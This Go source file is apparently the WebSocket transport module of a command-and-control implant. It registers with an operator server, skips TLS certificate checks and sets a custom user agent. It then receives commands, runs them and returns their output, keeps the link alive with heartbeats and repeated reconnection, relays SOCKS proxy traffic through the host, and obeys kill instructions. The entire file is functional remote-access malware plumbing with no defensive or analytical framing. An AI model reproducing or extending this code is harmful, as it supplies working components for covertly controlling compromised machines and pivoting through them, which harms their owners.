//go:build transport_ws

// transport_ws.go — WebSocket transport (requires gorilla/websocket)
package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/http"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

type ActiveTransport struct {
	url       string
	userAgent string
	conn      *websocket.Conn
	mu        sync.Mutex
	encryptFn func(string) (string, error)
	decryptFn func(string) (string, error)
	mode      string
	done      chan struct{}
	closeOnce sync.Once
}

func NewActiveTransport(scheme, host, port, ua, _, _, _ string,
	encFn func(string) (string, error), decFn func(string) (string, error)) *ActiveTransport {
	wsScheme := "ws"
	if scheme == "https" || scheme == "wss" {
		wsScheme = "wss"
	}
	return &ActiveTransport{
		url:       fmt.Sprintf("%s://%s:%s", wsScheme, host, port),
		userAgent: ua,
		encryptFn: encFn,
		decryptFn: decFn,
		mode:      "beacon",
		done:      make(chan struct{}),
	}
}

func (t *ActiveTransport) connect() error {
	dialer := websocket.Dialer{
		TLSClientConfig:  &tls.Config{InsecureSkipVerify: true},
		HandshakeTimeout: 30 * time.Second,
	}
	header := http.Header{}
	header.Set("User-Agent", t.userAgent)
	conn, _, err := dialer.Dial(t.url, header)
	if err != nil {
		return err
	}
	t.mu.Lock()
	t.conn = conn
	t.mu.Unlock()
	return nil
}

func (t *ActiveTransport) send(msg map[string]interface{}) error {
	t.mu.Lock()
	defer t.mu.Unlock()
	if t.conn == nil {
		return fmt.Errorf("connection closed")
	}
	data, _ := json.Marshal(msg)
	enc, err := t.encryptFn(string(data))
	if err != nil {
		return fmt.Errorf("encrypt: %w", err)
	}
	return t.conn.WriteMessage(websocket.TextMessage, []byte(enc))
}

func (t *ActiveTransport) recv() (map[string]interface{}, error) {
	t.mu.Lock()
	conn := t.conn
	t.mu.Unlock()
	if conn == nil {
		return nil, fmt.Errorf("connection closed")
	}
	_, message, err := conn.ReadMessage()
	if err != nil {
		return nil, err
	}
	dec, err := t.decryptFn(string(message))
	if err != nil {
		return nil, fmt.Errorf("decrypt: %w", err)
	}
	var result map[string]interface{}
	err = json.Unmarshal([]byte(dec), &result)
	return result, err
}

func (t *ActiveTransport) Register(metadata map[string]interface{}) (string, error) {
	if err := t.connect(); err != nil {
		return "", err
	}
	if err := t.send(map[string]interface{}{"type": "register", "metadata": metadata}); err != nil {
		return "", err
	}
	resp, err := t.recv()
	if err != nil {
		return "", err
	}
	if tp, _ := resp["type"].(string); tp == "registered" || tp == "checkin_ack" {
		if id, ok := resp["agent_id"].(string); ok {
			return id, nil
		}
	}
	return "", fmt.Errorf("registration failed")
}

func (t *ActiveTransport) Checkin(agentID string, results []map[string]interface{}) ([]map[string]interface{}, error) {
	if t.conn == nil {
		if err := t.connect(); err != nil {
			return nil, err
		}
	}
	if results == nil {
		results = []map[string]interface{}{}
	}
	msg := map[string]interface{}{
		"type": "checkin", "agent_id": agentID,
		"metadata": map[string]string{"mode": t.mode},
		"results":  results,
	}
	if err := t.send(msg); err != nil {
		t.conn = nil
		return nil, err
	}
	resp, err := t.recv()
	if err != nil {
		t.conn = nil
		return nil, err
	}
	var commands []map[string]interface{}
	if tp, _ := resp["type"].(string); tp == "checkin_ack" || tp == "registered" {
		if cmds, ok := resp["commands"].([]interface{}); ok {
			for _, c := range cmds {
				if cm, ok := c.(map[string]interface{}); ok {
					commands = append(commands, cm)
				}
			}
		}
		t.conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		for {
			cmd, err := t.recv()
			if err != nil {
				break
			}
			if ct, _ := cmd["type"].(string); ct == "command" {
				commands = append(commands, cmd)
			}
		}
		t.conn.SetReadDeadline(time.Time{})
	}
	return commands, nil
}

func (t *ActiveTransport) SendResult(agentID, command, output, commandID string) error {
	msg := map[string]interface{}{
		"type": "response", "output": output,
		"command": command, "timestamp": time.Now().Format(time.RFC3339),
	}
	if commandID != "" {
		msg["command_id"] = commandID
	}
	return t.send(msg)
}

func (t *ActiveTransport) StartStreaming(agentID string, handler func(string) string) error {
	t.mode = "streaming"
	consecutiveFailures := 0

	for {
		select {
		case <-t.done:
			return nil
		default:
		}
		if t.conn == nil {
			if err := t.connect(); err != nil {
				consecutiveFailures++
				if consecutiveFailures >= 50 {
					return err
				}
				time.Sleep(5 * time.Second)
				continue
			}
			if err := t.send(map[string]interface{}{
				"type": "checkin", "agent_id": agentID,
				"metadata": map[string]string{"mode": "streaming"},
			}); err != nil {
				t.mu.Lock()
				t.conn = nil
				t.mu.Unlock()
				continue
			}
			if _, err := t.recv(); err != nil {
				t.mu.Lock()
				t.conn = nil
				t.mu.Unlock()
				continue
			}
		}

		var doneOnce sync.Once
		done := make(chan struct{})
		closeDone := func() { doneOnce.Do(func() { close(done) }) }

		go func() {
			for {
				select {
				case <-done:
					return
				case <-t.done:
					return
				case <-time.After(10 * time.Second):
					t.send(map[string]interface{}{"type": "heartbeat"})
				}
			}
		}()

		var socksMgr *SocksManager
		sendFn := func(msg map[string]interface{}) error { return t.send(msg) }

		reconnect := false
		for {
			cmd, err := t.recv()
			if err != nil {
				closeDone()
				if socksMgr != nil {
					socksMgr.CloseAll()
				}
				t.mu.Lock()
				if t.conn != nil {
					t.conn.Close()
				}
				t.conn = nil
				t.mu.Unlock()
				consecutiveFailures++
				if consecutiveFailures >= 50 {
					return err
				}
				time.Sleep(5 * time.Second)
				reconnect = true
				break
			}
			consecutiveFailures = 0
			ct, _ := cmd["type"].(string)
			switch ct {
			case "command":
				command, _ := cmd["command"].(string)
				commandID, _ := cmd["command_id"].(string)
				if command == "__kill" {
					closeDone()
					return nil
				}
				go func() {
					t.SendResult(agentID, command, handler(command), commandID)
				}()
			case "kill":
				closeDone()
				return nil
			case "socks_init", "socks_connect", "socks_send", "socks_data":
				socksMgr = HandleSocksMessage(cmd, socksMgr, sendFn)
			case "heartbeat_ack", "set_interval":
				// no-op
			case "downgrade_mode":
				closeDone()
				if socksMgr != nil {
					socksMgr.CloseAll()
				}
				return nil
			}
		}
		if !reconnect {
			return nil
		}
	}
}

func (t *ActiveTransport) Close() {
	t.closeOnce.Do(func() {
		close(t.done)
	})
	t.mu.Lock()
	defer t.mu.Unlock()
	if t.conn != nil {
		t.conn.Close()
		t.conn = nil
	}
}
